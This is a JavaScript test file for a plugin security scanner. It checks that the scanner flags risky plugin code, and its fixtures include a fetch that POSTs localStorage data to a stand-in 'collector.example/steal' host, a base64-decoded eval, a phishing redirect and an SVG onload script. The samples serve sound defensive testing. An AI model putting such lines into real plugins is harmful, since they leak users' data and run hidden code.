import {scanPlugin} from '../../../src/lib/plugins/security-scan';

const encoder = new TextEncoder();

const archiveOf = (files, permissions = []) => ({
    manifest: {id: 'test', permissions},
    files: new Map(Object.entries(files).map(([path, text]) => [
        path,
        typeof text === 'string' ? encoder.encode(text) : text
    ])),
    symlinks: []
});

const rules = report => report.findings.map(finding => finding.rule);

describe('plugin security scan', () => {
    test('finds nothing risky in a plain effect plugin', () => {
        const report = scanPlugin(archiveOf({
            'main.js': `exports.activate = shading => {
                shading.penfx.registerProgram('tint', shading.files.text('tint.glsl'));
            };`,
            'tint.glsl': 'void main() { gl_FragColor = vec4(1.0); }',
            'shading-plugin.json': '{}'
        }));
        expect(report.level).toBe('none');
        expect(report.findings).toEqual([]);
    });

    test('flags code that reaches outside the editor, with file and line', () => {
        const report = scanPlugin(archiveOf({
            'main.js': [
                'exports.activate = () => {',
                '  fetch("https://collector.example/steal", {method: "POST", body: localStorage.getItem("x")});',
                '  eval(atob("YWxlcnQoMSk="));',
                '  window.shadingDesktop.saveBlob();',
                '  window.location.href = "https://phish.example";',
                '};'
            ].join('\n')
        }));
        expect(report.level).toBe('high');
        expect(rules(report)).toEqual(expect.arrayContaining([
            'network', 'external-url', 'browser-storage', 'dynamic-code', 'encoded-strings', 'desktop-bridge',
            'navigation'
        ]));
        const network = report.findings.find(finding => finding.rule === 'network');
        expect(network.file).toBe('main.js');
        expect(network.occurrences[0].line).toBe(2);
        expect(network.occurrences[0].snippet).toContain('fetch(');
        expect(report.undeclaredPermissions).toEqual(expect.arrayContaining(['network', 'storage', 'dynamic-code']));
    });

    test('marks declared capabilities as declared but still reports them', () => {
        const report = scanPlugin(archiveOf({'main.js': 'fetch("./data.json");'}, ['network']));
        const network = report.findings.find(finding => finding.rule === 'network');
        expect(network.declared).toBe(true);
        expect(report.undeclaredPermissions).toEqual([]);
        expect(report.level).toBe('medium');
    });

    test('flags scripts in markup, executables, credential forms and global hooks', () => {
        const report = scanPlugin(archiveOf({
            'ui.svg': '<svg onload="alert(1)"></svg>',
            'tool.exe': new Uint8Array([77, 90, 0, 0]),
            'login.js': 'input.type = "password"; window.fetch = spy;',
            'patch.js': 'Array.prototype.map = function () {};'
        }));
        expect(rules(report)).toEqual(expect.arrayContaining([
            'markup-script', 'executable-file', 'credentials', 'global-hooks'
        ]));
        expect(report.summary.high).toBeGreaterThanOrEqual(4);
    });

    test('ignores benign namespace URLs', () => {
        const report = scanPlugin(archiveOf({'main.js': 'document.createElementNS("http://www.w3.org/2000/svg", "svg");'}));
        expect(rules(report)).not.toContain('external-url');
    });
});
